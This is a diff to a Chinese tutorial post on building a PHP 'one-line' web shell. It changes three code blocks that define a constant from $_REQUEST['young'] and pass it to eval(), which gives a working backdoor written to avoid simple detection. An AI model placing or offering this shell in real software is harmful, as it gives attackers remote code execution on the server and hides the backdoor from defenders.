@@ -53,7 +53,7 @@ author: young
 就这样开始定义
 
 ```php
-\define("hi","$_REQUEST['young']")
+define("hi","$_REQUEST['young']")
 ```
 
 就定义了一个基本成型的一句话，然后再看一下正常的一句话
@@ -68,7 +68,7 @@ author: young
 
 ```php
 <?php
-\define("hi","$_REQUEST[young]");
+define("hi","$_REQUEST[young]");
 ?>
 ```
 
@@ -79,7 +79,7 @@ author: young
 
 ```php
 <?php
-\define("hi","$_REQUEST[young]");
+define("hi","$_REQUEST[young]");
 eval(hi);
 ?>
 ```
